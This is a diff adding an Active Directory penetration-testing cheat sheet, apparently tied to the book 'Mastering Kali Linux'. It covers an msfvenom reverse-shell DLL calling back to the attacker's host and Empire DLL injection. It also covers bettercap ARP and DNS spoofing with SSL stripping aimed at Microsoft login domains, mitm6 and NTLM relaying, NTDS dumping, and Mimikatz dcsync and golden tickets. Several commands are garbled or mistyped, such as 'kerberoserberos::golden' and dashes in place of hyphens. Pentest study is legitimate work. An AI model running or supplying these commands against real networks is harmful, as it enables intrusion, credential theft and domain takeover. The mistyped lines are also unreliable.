@@ -1,1 +1,75 @@
+sudo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<Kali IP> lport=443 -f dll -o /home/kali/injectmex64.dll
 
+
+sudo powershell-empire server
+sudo powershell-empire client (in a new tab)
+uselistener http
+set Host <Your IP>
+set Port <port number>
+execute
+usestager multi/launcher
+set Listener http
+execute
+
+(Empire: 2A54TX1L) > ps
+(Empire: 2A54TX1L) > upload /root/chap12/injectme.dll
+(Empire: 2A54TX1L) > usemodule code_execution/invoke_dllinjection
+(Empire: powershell/code_execution/invoke_dllinjection) > set ProcessID
+4060
+(Empire: powershell/code_execution/invoke_dllinjection) > set Dll
+C:\<location>\injectmex64.dll
+(Empire: powershell/code_execution/invoke_dllinjection) > execute
+
+
+#Bettercap
+
+      net.sniff on
+      " set http.proxy.sslstrip true
+      " http.proxy on
+      " set dns.spoof.domains www.office.com,login.microsoftonline.com,testfire.
+      net
+      " set dns.spoof.all true
+      " dns.spoof on
+      " arp.spoof on
+
+  #ssl strip
+    " net.sniff on
+    " set https.proxy.sslstrip true
+    " https.proxy on
+    " arp.spoof on
+    " hstshijack/hstshijack
+    
+    
+sudo pip3 install mitm6
+sudo mitm6 –hw <Windows 10 machine name> -d <Domain name> --ignore-nofqdn
+sudo impact-ntlmrelayx –t ldaps://domaincontrollerIP –delegate-access –no-smb-server –wh attacker-wpad
+sudo impact-getST –spn SPNname/TargetMachinename Domainname/NewComputerCreatedbyNTLMrelayx –impersonate Administrator –dc-ip <Domaincontroller IP >
+sudo impacket-wmiexec -k –no-pass –debug target-Machine-DNS-Name
+sudo impacket-secretsdump –k –no-pass –debug <Target Machine name
+
+#EmpirePowershell
+
+usemodule situational_awareness/network/powerview/get_domain_controller
+usemodule situational_awareness/network/powerview/get_loggedOn 
+execute
+
+#NTDS 
+ntdsutil "ac I ntds" "ifm""create full c:\temp" q q
+secretsdump.py -system <systemregistry> -security <securityregistry> -ntds <location of ntds> "LOCAL"
+
+#Goldenticket
+
+usemodule credentials/Mimikatz/dcysnc
+set domain mastering.kali.fourthedition
+set username krbtgt
+run
+
+usemodule credentials/mimikatz/golden_ticket
+set user Cred ID
+set user IDONTEXIST
+execute
+
+#Mimikatz
+
+kerberoserberos::golden /admin:Administrator /domain:Mastering.kali.fourthedition /id:ACCOUNTID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
+Lsadump::dcsync /domain:mastering.kali.fourthedition /all /csv
